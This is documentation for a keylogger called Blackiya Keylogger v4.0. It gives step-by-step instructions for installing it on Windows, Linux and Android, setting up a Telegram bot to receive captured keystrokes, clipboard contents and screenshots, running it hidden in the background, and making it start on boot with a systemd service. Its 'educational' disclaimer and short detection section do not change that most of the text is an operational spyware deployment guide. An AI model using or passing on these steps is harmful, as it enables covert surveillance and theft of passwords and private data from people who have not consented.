╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                      BLACKIYA KEYLOGGER v4.0 - COMPLETE DOCUMENTATION                                                      ║
║                                                         Author: BlAck1ya | GitHub: @BlAck1ya                                                               ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝

┌────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│ 📌 WHAT IS BLACKIYA KEYLOGGER?                                                                                                                             │
├────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
│ Blackiya Keylogger is an educational security tool that captures keystrokes from all applications including browsers, terminals, clipboard, and screenshots.│
│ Designed for penetration testing and security research. FOR EDUCATIONAL PURPOSES ONLY.                                                                     │
└────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│ ⚡ FEATURES                                                                                                                                                 │
├────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
│ 🌐 Browser Capture     │ Chrome, Firefox, Edge, Brave, Opera                                                                                               │
│ 💻 Terminal Capture    │ All console commands                                                                                                              │
│ 📸 Screenshots         │ Every 45 seconds (no black screens)                                                                                               │
│ 📋 Clipboard           │ Real-time clipboard monitoring                                                                                                    │
│ 🪟 Window Tracking     │ Knows which app is active                                                                                                         │
│ ⚡ Batch Processing    │ Multiple words together (superfast)                                                                                               │
│ 📨 Telegram Integration│ Live data exfiltration                                                                                                             │
│ 🔄 Persistence         │ Auto-start on boot                                                                                                                │
│ 🐧 Cross-platform      │ Windows/Linux/macOS/Android                                                                                                       │
└────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│ 📋 COMPLETE SETUP GUIDE - TELEGRAM BOT SETUP                                                                                                               │
├────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                                                                                             │
│  STEP 1.1: Create Telegram Account                                                                                                                         │
│  ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │
│  1. Download Telegram from: Android: Google Play Store | iOS: App Store | PC: https://desktop.telegram.org                                                │
│  2. Open Telegram and sign up with your phone number                                                                                                       │
│  3. Verify OTP and complete registration                                                                                                                   │
│                                                                                                                                                             │
│  STEP 1.2: Create Bot using BotFather                                                                                                                      │
│  ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │
│  1. Open Telegram and search: @BotFather                                                                                                                   │
│  2. Send: /start                                                                                                                                           │
│  3. Send: /newbot                                                                                                                                          │
│  4. BotFather asks: "What's your bot name?" → Send: BlackiyaKeyloggerBot                                                                                   │
│  5. BotFather asks: "What's your bot username?" → Send: BlackiyaKeyloggerBot (must end with 'bot')                                                         │
│  6. ✅ COPY THE TOKEN! Example: 1234567890:ABCdefGHIjklMNOpqrsTUVwxyz                                                                                       │
│                                                                                                                                                             │
│  STEP 1.3: Get Your Chat ID                                                                                                                                 │
│  ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │
│  Method 1 (Easiest): Search Telegram: @userinfobot → Send: /start → Bot replies: "Your chat ID: 9876543210" → ✅ COPY THIS CHAT ID!                        │
│  Method 2 (Terminal): curl "https://api.telegram.org/botYOUR_TOKEN/getUpdates"                                                                             │
│                                                                                                                                                             │
│  STEP 1.4: Test Your Bot                                                                                                                                    │
│  ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │
│  curl "https://api.telegram.org/botYOUR_TOKEN/sendMessage?chat_id=CHAT_ID&text=Test"                                                                       │
│                                                                                                                                                             │
└────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│ 🐧 LINUX INSTALLATION (Kali/Ubuntu/Debian)                                                                                                                 │
├────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                                                                                             │
│  # Update system                                                                                                                                           │
│  sudo apt update && sudo apt upgrade -y                                                                                                                    │
│                                                                                                                                                             │
│  # Install Python and tools                                                                                                                                 │
│  sudo apt install python3 python3-pip python3-venv -y                                                                                                      │
│  sudo apt install scrot xdotool xclip gnome-screenshot -y                                                                                                  │
│                                                                                                                                                             │
│  # Clone repository                                                                                                                                        │
│  git clone https://github.com/BlAck1ya/BlackiyaKeylogger.git                                                                                               │
│  cd BlackiyaKeylogger                                                                                                                                      │
│                                                                                                                                                             │
│  # Create virtual environment                                                                                                                              │
│  python3 -m venv venv                                                                                                                                      │
│  source venv/bin/activate                                                                                                                                  │
│                                                                                                                                                             │
│  # Install Python packages                                                                                                                                 │
│  pip install requests pynput evdev pillow pyperclip mss                                                                                                    │
│                                                                                                                                                             │
│  # Run the script                                                                                                                                          │
│  python3 BlackiyaKeylogger.py                                                                                                                              │
│                                                                                                                                                             │
└────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│ 🪟 WINDOWS INSTALLATION (10/11)                                                                                                                            │
├────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                                                                                             │
│  # Install Python from python.org (3.8+) - CHECK "Add Python to PATH"                                                                                      │
│                                                                                                                                                             │
│  # Open Command Prompt as Administrator                                                                                                                    │
│  git clone https://github.com/BlAck1ya/BlackiyaKeylogger.git                                                                                               │
│  cd BlackiyaKeylogger                                                                                                                                      │
│                                                                                                                                                             │
│  python -m venv venv                                                                                                                                       │
│  venv\Scripts\activate                                                                                                                                     │
│  pip install requests pynput pillow pyperclip mss                                                                                                          │
│                                                                                                                                                             │
│  python BlackiyaKeylogger.py                                                                                                                               │
│                                                                                                                                                             │
└────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│ 📱 ANDROID INSTALLATION (Termux)                                                                                                                           │
├────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                                                                                             │
│  # Install Termux from F-Droid (NOT Play Store)                                                                                                            │
│  pkg update && pkg upgrade -y                                                                                                                              │
│  pkg install python git -y                                                                                                                                 │
│                                                                                                                                                             │
│  git clone https://github.com/BlAck1ya/BlackiyaKeylogger.git                                                                                               │
│  cd BlackiyaKeylogger                                                                                                                                      │
│  pip install requests pynput                                                                                                                               │
│                                                                                                                                                             │
│  python BlackiyaKeylogger.py                                                                                                                               │
│                                                                                                                                                             │
└────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│ ⚙️ CONFIGURATION                                                                                                                                           │
├────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                                                                                             │
│  # Edit the script                                                                                                                                         │
│  nano BlackiyaKeylogger.py                                                                                                                                 │
│                                                                                                                                                             │
│  # Find and replace these lines:                                                                                                                           │
│  TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # Paste your token from BotFather                                                                             │
│  TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"      # Paste your chat ID from userinfobot                                                                         │
│                                                                                                                                                             │
│  # Optional settings you can change:                                                                                                                       │
│  SEND_DELAY = 0.5          # Send after 0.5 seconds of inactivity                                                                                          │
│  MAX_BUFFER = 200          # Max characters before force send                                                                                              │
│  SCREENSHOT_INTERVAL = 45  # Screenshot every 45 seconds                                                                                                   │
│  ENABLE_SCREENSHOTS = True # Enable/disable screenshots                                                                                                    │
│  ENABLE_CLIPBOARD = True   # Enable/disable clipboard monitoring                                                                                           │
│                                                                                                                                                             │
└────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│ 🚀 USAGE & COMMANDS                                                                                                                                        │
├────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                                                                                             │
│  # Basic Run                                                                                                                                               │
│  source venv/bin/activate  # Linux                                                                                                                         │
│  venv\Scripts\activate     # Windows                                                                                                                       │
│  python3 BlackiyaKeylogger.py                                                                                                                              │
│                                                                                                                                                             │
│  # Run in Background (Linux)                                                                                                                               │
│  nohup python3 BlackiyaKeylogger.py > /dev/null 2>&1 &                                                                                                     │
│  ps aux | grep BlackiyaKeylogger  # Check running                                                                                                          │
│  pkill -f BlackiyaKeylogger        # Stop                                                                                                                  │
│                                                                                                                                                             │
│  # Run in Background (Windows)                                                                                                                             │
│  ren BlackiyaKeylogger.py BlackiyaKeylogger.pyw                                                                                                            │
│  pythonw.exe BlackiyaKeylogger.pyw                                                                                                                         │
│                                                                                                                                                             │
│  # Auto-start on Boot (Linux - Systemd)                                                                                                                    │
│  sudo nano /etc/systemd/system/blackiya-keylogger.service                                                                                                  │
│                                                                                                                                                             │
│  # Paste this:                                                                                                                                             │
│  [Unit]                                                                                                                                                    │
│  Description=Blackiya Keylogger Service                                                                                                                    │
│  After=network.target                                                                                                                                      │
│                                                                                                                                                             │
│  [Service]                                                                                                                                                 │
│  Type=simple                                                                                                                                               │
│  ExecStart=/usr/bin/python3 /home/YOUR_USERNAME/BlackiyaKeylogger/BlackiyaKeylogger.py                                                                     │
│  Restart=always                                                                                                                                            │
│  User=YOUR_USERNAME                                                                                                                                        │
│                                                                                                                                                             │
│  [Install]                                                                                                                                                 │
│  WantedBy=multi-user.target                                                                                                                                │
│                                                                                                                                                             │
│  # Enable and start                                                                                                                                        │
│  sudo systemctl enable blackiya-keylogger.service                                                                                                          │
│  sudo systemctl start blackiya-keylogger.service                                                                                                           │
│                                                                                                                                                             │
└────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│ 🧪 TESTING YOUR KEYLOGGER                                                                                                                                  │
├────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                                                                                             │
│  TEST 1: Keylogger Functionality                                                                                                                           │
│  ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │
│  After running script, open another terminal and type:                                                                                                     │
│  echo "Hello this is a test"                                                                                                                               │
│  ls -la                                                                                                                                                    │
│  whoami                                                                                                                                                    │
│  # Check Telegram - you'll see these keystrokes with 💻 icon                                                                                               │
│                                                                                                                                                             │
│  TEST 2: Browser Capture                                                                                                                                   │
│  ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │
│  1. Open Chrome/Firefox                                                                                                                                     │
│  2. Type in search bar: "How to become ethical hacker"                                                                                                     │
│  3. Check Telegram - you'll see 🌐 icon with browser name                                                                                                  │
│                                                                                                                                                             │
│  TEST 3: Screenshot Capture                                                                                                                                 │
│  ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │
│  Wait 45 seconds after starting script → Check Telegram → Screenshot will appear (NOT black)                                                               │
│                                                                                                                                                             │
│  TEST 4: Clipboard Monitoring                                                                                                                              │
│  ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │
│  Linux: echo "MySecretPassword123" | xclip -selection clipboard                                                                                            │
│  Windows: echo "MySecretPassword123" | clip                                                                                                                │
│  # Check Telegram - clipboard content appears with 🔐 icon if sensitive                                                                                    │
│                                                                                                                                                             │
│  EXPECTED TELEGRAM OUTPUT:                                                                                                                                 │
│  ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │
│  🚀 BLACKIYA KEYLOGGER v4.0 ACTIVATED                                                                                                                       │
│  👤 Author: BlAck1ya | 🖥️ Hostname: kali | ✅ Status: MONITORING ACTIVE                                                                                    │
│                                                                                                                                                             │
│  🌐 [14:30:15] Chrome - Google Search                                                                                                                      │
│  ```                                                                                                                                                       │
│  Hello world this is a browser test                                                                                                                        │
│  ```                                                                                                                                                       │
│                                                                                                                                                             │
│  💻 [14:30:30] terminal - bash                                                                                                                             │
│  ```                                                                                                                                                       │
│  sudo apt update                                                                                                                                           │
│  ```                                                                                                                                                       │
│                                                                                                                                                             │
│  📸 [14:31:00] Screenshot captured                                                                                                                         │
│  [Image]                                                                                                                                                   │
│                                                                                                                                                             │
│  📊 STATS (every 5 min) | 🔑 Total Keys: 1547                                                                                                              │
│                                                                                                                                                             │
└────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│ 🔧 TROUBLESHOOTING                                                                                                                                         │
├────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                                                                                             │
│  ISSUE 1: "externally-managed-environment" (Kali Linux)                                                                                                    │
│  SOLUTION: Use virtual environment                                                                                                                         │
│  python3 -m venv venv && source venv/bin/activate && pip install -r requirements.txt                                                                       │
│                                                                                                                                                             │
│  ISSUE 2: Screenshot is Black                                                                                                                              │
│  SOLUTION: Check display server - echo $XDG_SESSION_TYPE                                                                                                   │
│  If "wayland", switch to X11: Logout → Click gear icon → Select "X11" → Login                                                                              │
│  Or install: sudo apt install scrot gnome-screenshot maim -y                                                                                               │
│                                                                                                                                                             │
│  ISSUE 3: Browser Keys Not Captured                                                                                                                        │
│  SOLUTION: Install evdev - pip install evdev                                                                                                               │
│  Run as root - sudo python3 BlackiyaKeylogger.py                                                                                                           │
│  Check permissions - ls -la /dev/input/event*                                                                                                              │
│                                                                                                                                                             │
│  ISSUE 4: Clipboard Not Working                                                                                                                            │
│  SOLUTION: Linux - sudo apt install xclip xsel -y                                                                                                          │
│  Test: echo "test" | xclip -selection clipboard && xclip -selection clipboard -o                                                                          │
│                                                                                                                                                             │
│  ISSUE 5: Telegram Not Receiving Messages                                                                                                                  │
│  SOLUTION: Test bot - curl "https://api.telegram.org/botYOUR_TOKEN/getMe"                                                                                  │
│  Test send - curl "https://api.telegram.org/botYOUR_TOKEN/sendMessage?chat_id=CHAT_ID&text=Test"                                                           │
│  Common issues: Token incorrect (format: numbers:letters), Chat ID wrong (numbers only), Bot not started (search and click START)                         │
│                                                                                                                                                             │
│  ISSUE 6: Permission Denied                                                                                                                                │
│  SOLUTION: chmod +x BlackiyaKeylogger.py && sudo python3 BlackiyaKeylogger.py                                                                              │
│                                                                                                                                                             │
└────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│ 🛡️ DETECTION & PREVENTION                                                                                                                                 │
├────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                                                                                             │
│  HOW TO DETECT ON YOUR SYSTEM                                                                                                                              │
│  ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │
│                                                                                                                                                             │
│  LINUX DETECTION COMMANDS:                                                                                                                                 │
│  ps aux | grep -i keylogger           # Check processes                                                                                                   │
│  ps aux | grep python                 # Check Python processes                                                                                            │
│  netstat -an | grep -i telegram       # Check network connections                                                                                         │
│  lsof -i | grep python                # Check Python network                                                                                              │
│  systemctl list-unit-files | grep -i keylogger  # Check startup services                                                                                  │
│  crontab -l                           # Check scheduled tasks                                                                                             │
│  find /home -name "*.py" -path "*/\.*" 2>/dev/null  # Check hidden files                                                                                  │
│                                                                                                                                                             │
│  WINDOWS DETECTION COMMANDS:                                                                                                                               │
│  tasklist | findstr python            # Check processes                                                                                                   │
│  netstat -ano | findstr ESTABLISHED   # Check network                                                                                                     │
│  reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run  # Check startup registry                                                                   │
│  schtasks /query | findstr python     # Check scheduled tasks                                                                                             │
│                                                                                                                                                             │
│  HOW TO PROTECT YOURSELF                                                                                                                                    │
│  ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │
│                                                                                                                                                             │
│  1. Use 2FA/MFA on all accounts (Keylogger can only get password, not OTP)                                                                                 │
│  2. Use virtual keyboard for sensitive data                                                                                                                │
│  3. Regular antivirus scans: sudo apt install clamav -y && clamscan -r /home                                                                               │
│  4. Monitor outgoing connections: sudo netstat -tulpn | grep ESTABLISHED                                                                                   │
│  5. Use firewall: sudo ufw enable && sudo ufw default deny outgoing && sudo ufw allow out to any port 80,443 proto tcp                                     │
│  6. Keep system updated: sudo apt update && sudo apt upgrade -y                                                                                            │
│  7. Use application whitelisting                                                                                                                           │
│  8. Check for suspicious startup items regularly                                                                                                           │
│  9. Use password manager (autotype, no keystrokes)                                                                                                         │
│  10. Be careful what you download and run                                                                                                                  │
│                                                                                                                                                             │
└────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│ ⚖️ LEGAL DISCLAIMER                                                                                                                                        │
├────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                                                                                             │
│  ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗ │
│  ║                                           LEGAL DISCLAIMER                                                                                             ║ │
│  ╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣ │
│  ║                                                                                                                                                        ║ │
│  ║  THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY                                                                                                           ║ │
│  ║                                                                                                                                                        ║ │
│  ║  ✅ DO use on YOUR OWN computers                                                                                                                       ║ │
│  ║  ✅ DO use in LAB environments                                                                                                                         ║ │
│  ║  ✅ DO use for SECURITY RESEARCH with written permission                                                                                               ║ │
│  ║                                                                                                                                                        ║ │
│  ║  ❌ DON'T deploy on others' devices without permission                                                                                                 ║ │
│  ║  ❌ DON'T use for stealing data or credentials                                                                                                         ║ │
│  ║  ❌ DON'T distribute as malware                                                                                                                        ║ │
│  ║                                                                                                                                                        ║ │
│  ║  PENALTIES under Indian IT Act 2000:                                                                                                                   ║ │
│  ║  - Section 66C: Identity theft - 3 years imprisonment + ₹5 lakh fine                                                                                  ║ │
│  ║  - Section 66D: Cheating by impersonation - 3 years imprisonment + ₹1 lakh fine                                                                       ║ │
│  ║  - Section 43: Unauthorized access - Compensation up to ₹1 crore                                                                                      ║ │
│  ║  - Section 66: Computer-related offenses - 3 years imprisonment or ₹5 lakh fine                                                                       ║ │
│  ║                                                                                                                                                        ║ │
│  ║  INTERNATIONAL LAWS:                                                                                                                                   ║ │
│  ║  - USA: CFAA - 10 years federal prison + $250,000 fine                                                                                                 ║ │
│  ║  - UK: Computer Misuse Act 1990 - 5-10 years imprisonment                                                                                              ║ │
│  ║  - EU: GDPR violations - €20 million or 4% global turnover                                                                                             ║ │
│  ║                                                                                                                                                        ║ │
│  ║  By using this software, you agree to use it responsibly and only on systems you own or have written permission to test.                              ║ │
│  ║  THE AUTHOR IS NOT RESPONSIBLE FOR ANY MISUSE OF THIS TOOL.                                                                                            ║ │
│  ║                                                                                                                                                        ║ │
│  ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝ │
│                                                                                                                                                             │
└────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│ 📞 CONTACT & SUPPORT                                                                                                                                       │
├────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                                                                                             │
│  Author: BlAck1ya                                                                                                                                          │
│  GitHub: https://github.com/BlAck1ya/BlackiyaKeylogger                                                                                                     │
│  Telegram: @BlAck1ya                                                                                                                                       │
│                                                                                                                                                             │
│  ⭐ Show Your Support: Star this repository | Fork it | Share with security enthusiasts                                                                   │
│                                                                                                                                                             │
└────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│ 📝 QUICK COPY-PASTE COMMANDS                                                                                                                               │
├────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                                                                                             │
│  # Complete Linux Installation (One Line)                                                                                                                  │
│  sudo apt update && sudo apt install python3 python3-pip python3-venv scrot xdotool xclip -y && git clone https://github.com/BlAck1ya/BlackiyaKeylogger.git && cd BlackiyaKeylogger && python3 -m venv venv && source venv/bin/activate && pip install requests pynput evdev pillow pyperclip mss && python3 BlackiyaKeylogger.py │
│                                                                                                                                                             │
│  # Test Telegram Bot (Replace YOUR_TOKEN and CHAT_ID)                                                                                                      │
│  curl "https://api.telegram.org/botYOUR_TOKEN/sendMessage?chat_id=CHAT_ID&text=Blackiya%20Keylogger%20is%20Working"                                        │
│                                                                                                                                                             │
│  # Check if Keylogger is Running                                                                                                                           │
│  ps aux | grep -i blackiya                                                                                                                                 │
│                                                                                                                                                             │
│  # Stop Keylogger                                                                                                                                          │
│  pkill -f BlackiyaKeylogger                                                                                                                                │
│                                                                                                                                                             │
└────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘

╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                              Made with 🔥 by BlAck1ya                                                                                        ║
║                                     "With great power comes great responsibility. Use this tool ethically!"                                                   ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
